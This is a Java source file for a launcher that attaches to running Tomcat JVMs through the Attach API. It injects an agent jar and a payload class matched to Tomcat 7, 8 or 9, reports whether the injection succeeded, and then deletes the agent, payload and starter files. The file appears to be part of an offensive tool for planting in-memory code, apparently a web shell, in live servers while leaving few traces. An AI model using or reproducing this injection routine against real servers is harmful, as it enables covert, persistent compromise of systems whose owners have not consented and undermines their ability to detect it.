import com.sun.tools.attach.VirtualMachine;
import com.sun.tools.attach.VirtualMachineDescriptor;
import cons.Constants;
import util.ClientUtil;
import util.FileUtil;
import util.Logger;
import util.WebAppCheck;

import java.util.ArrayList;
import java.util.List;
import java.util.Map;

public class Main {

    public static void main(String[] args) throws Exception {
        Map<String, String> map = ClientUtil.getArgs(args);
        if (map == null) {
            return;
        }
        String assignName = map.get("assignName");
        String tomcat_version = map.get("tomcat_version");

        String localDir = Constants.LOCAL_DIR;
        // Check whether the target application is started.
        while (!WebAppCheck.check()) {
            Logger.print("The target port is not open. Continue to try after 10 seconds...");
            Thread.sleep(10000);
        }

        // release lib jars
        FileUtil.releaseLibJar();
        // release agent.jar
        FileUtil.releaseFile("/agent/agent.jar", Constants.AGENT);

        String[] payloadPathArray = {
                Constants.TOMCAT_CLASS_DIR + "tomcat7.cls",
                Constants.TOMCAT_CLASS_DIR + "tomcat8.cls",
                Constants.TOMCAT_CLASS_DIR + "tomcat9.cls"
        };
        List<VirtualMachineDescriptor> list = VirtualMachine.list();
        Constants.AGENT_JAR_PATH = localDir + "/" + Constants.AGENT;
        boolean deleteStarter = true;
        List<String> pids = new ArrayList<String>();
        Logger.print("local_pid:" + Constants.LOCAL_PID);
        pids.add(Constants.LOCAL_PID);
        label:
        for (VirtualMachineDescriptor vmd : list) {
            String pid = vmd.id();
            String displayName = vmd.displayName();
            if (displayName.equals(assignName) || pid.equals(assignName) || "all".equals(assignName)) {
                try {
                    String payloadPath;
                    switch (tomcat_version) {
                        case "7":
                            payloadPath = payloadPathArray[0];
                            break;
                        case "8":
                            payloadPath = payloadPathArray[1];
                            break;
                        case "9":
                            payloadPath = payloadPathArray[2];
                            break;
                        default:
                            Logger.printErr("Incorrect input format! \"tomcat_version\"");
                            break label;
                    }

                    Constants.START_ARGS = displayName;
                    Constants.TOMCAT_VERSION = tomcat_version;
                    // Generate web server configuration file
                    FileUtil.generateConfig();

                    // release Payload
                    FileUtil.releaseFile(payloadPath, "Payload");

                    Logger.print("injection process_name:" + Constants.START_ARGS);
                    Logger.print("injection tomcat_version:" + Constants.TOMCAT_VERSION);
                    Logger.print("injection pid:" + pid);

                    VirtualMachine vm = VirtualMachine.attach(pid);
                    vm.loadAgent(Constants.AGENT_JAR_PATH);
                    vm.detach();

                    // Check whether the current Tomcat version can be successfully injected
                    if ("true".equals(FileUtil.getAgentConfig("success"))) {
                        Logger.print("Injection successful");
                        pids.add(pid);
                    } else {
                        Logger.printErr(payloadPath + "tomcat_version:" + tomcat_version + " incorrect version, injection failed.");
                        Logger.tips();
                        deleteStarter = false;
                    }

                } catch (Exception ignored) {
                }
                //break;
            }
        }

        // clean up
        FileUtil.clean4windows(pids);
        FileUtil.delFile(Constants.TMP_DIR, Constants.AGENT_CONFIG_FILE);
        FileUtil.delFile(Constants.LOCAL_DIR, "Payload");
        FileUtil.delTmpLib();
        if (deleteStarter) {
            FileUtil.delFile(localDir, Constants.AGENT_STARTER);
        }
        FileUtil.delFile(localDir, Constants.AGENT);
    }
}
